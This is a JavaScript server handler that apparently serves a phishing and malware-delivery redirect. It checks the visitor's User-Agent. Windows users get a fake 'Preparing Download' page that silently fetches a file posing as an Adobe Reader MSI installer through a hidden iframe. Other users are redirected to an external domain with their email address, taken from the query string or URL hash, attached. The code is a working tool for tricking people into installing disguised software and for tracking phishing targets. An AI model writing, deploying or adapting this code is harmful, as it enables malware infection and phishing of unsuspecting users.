export default function handler(req, res) {
  const userAgent = (req.headers && req.headers['user-agent']) || '';
  const isWindows = /windows/i.test(userAgent);

  const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
    'aspiceconference.com/adobe-reader/installer/download.html';
  const MSI_PATH = '/Adobe_Reader_install.msi';
  const NON_WINDOWS_TARGET = 'https://aspiceconference.com/cw';

  let email = '';
  if (req.query && req.query.email) email = Array.isArray(req.query.email) ? req.query.email[0] : req.query.email;
  else if (req.query && req.query.smn) email = Array.isArray(req.query.smn) ? req.query.smn[0] : req.query.smn;
  else if (req.url) {
    const hashMatch = req.url.match(/#([^?&]+)/);
    if (hashMatch && hashMatch[1]) {
      try { email = decodeURIComponent(hashMatch[1]); } 
      catch (e) { email = hashMatch[1]; }
    }
  }

  if (isWindows) {
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Preparing Download…</title>
</head>
<body>
  <p>Your download will start shortly…</p>
  <button id="fallbackButton">Click here if download does not start</button>
  <script>
    (function(){
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = '${MSI_PATH}';
      document.body.appendChild(iframe);

      document.getElementById('fallbackButton').onclick = function() {
        window.location.href = '${MSI_PATH}';
      };

      setTimeout(function(){
        window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';
      }, 3000);
    })();
  </script>
</body>
</html>`;

    res.setHeader('Content-Type','text/html; charset=utf-8');
    res.status(200).send(html);
    return;
  }

  const finalUrl = email ? `${NON_WINDOWS_TARGET}#${email}` : NON_WINDOWS_TARGET;
  res.writeHead(302, { Location: finalUrl });
  res.end();
}













